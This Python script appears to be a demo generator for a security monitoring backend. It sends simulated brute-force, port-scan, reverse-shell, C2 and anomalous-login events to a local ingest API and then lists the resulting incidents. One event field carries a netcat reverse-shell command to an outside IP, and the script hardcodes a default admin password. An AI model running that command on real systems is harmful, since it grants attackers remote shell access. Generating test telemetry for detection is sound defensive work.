#!/usr/bin/env python3
"""Generate all Phase 2 attack scenarios against the running backend — no VM needed.

    pip install requests
    python backend/scripts/demo_scenarios.py

Produces: brute-force + compromise (critical), port scan, suspicious process,
outbound C2, and an anomalous login — then prints the resulting incidents.
"""
from datetime import datetime, timezone, timedelta
import requests

BACKEND = "http://localhost:8000"
ASSET = "UBUNTU-SERVER-01"
ADMIN = {"username": "admin@socmind.io", "password": "ChangeMe123!"}


def ingest(**kw):
    kw.setdefault("asset", ASSET)
    kw["timestamp"] = kw.pop("ts").isoformat()
    return requests.post(f"{BACKEND}/api/events/ingest", json=kw, timeout=5).json()


def main():
    now = datetime.now(timezone.utc)

    # 1) Brute force then a successful login -> escalates to CRITICAL
    for i in range(5):
        ingest(ts=now + timedelta(seconds=i * 4),
               event_type="authentication_failure",
               source_ip="192.168.56.66", username="root", severity="medium")
    ingest(ts=now + timedelta(seconds=40), event_type="authentication_success",
           source_ip="192.168.56.66", username="root", severity="low")

    # 2) Port scan — 12 distinct destination ports
    for p in range(12):
        ingest(ts=now + timedelta(minutes=2, seconds=p),
               event_type="network_connection",
               source_ip="192.168.56.70", attributes={"dest_port": 20 + p})

    # 3) Suspicious process
    ingest(ts=now + timedelta(minutes=5), event_type="suspicious_process",
           username="ubuntu", attributes={"process_name": "nc -e /bin/bash 185.1.1.1 4444"})

    # 4) Unusual outbound connection (possible C2)
    ingest(ts=now + timedelta(minutes=6), event_type="outbound_connection",
           attributes={"dest_ip": "185.234.1.9", "dest_port": 4444})

    # 5) Anomalous login — build history for 'analyst', then a new-IP off-hours login
    hist = now - timedelta(days=5)
    for d in range(4):
        ingest(ts=hist + timedelta(days=d, hours=10),
               event_type="authentication_success",
               source_ip="192.168.56.10", username="analyst", severity="low")
    ingest(ts=now.replace(hour=3) + timedelta(minutes=10),
           event_type="authentication_success",
           source_ip="203.0.113.7", username="analyst", severity="low")

    tok = requests.post(f"{BACKEND}/api/auth/login", data=ADMIN, timeout=5)
    headers = {"Authorization": f"Bearer {tok.json()['access_token']}"}

    print("\n=== Incidents ===")
    for inc in requests.get(f"{BACKEND}/api/incidents", headers=headers).json():
        print(f"#{inc['id']} [{inc['severity']}] {inc['title']} "
              f"(conf {inc['confidence']*100:.0f}%, related {inc['related_count']})")


if __name__ == "__main__":
    main()
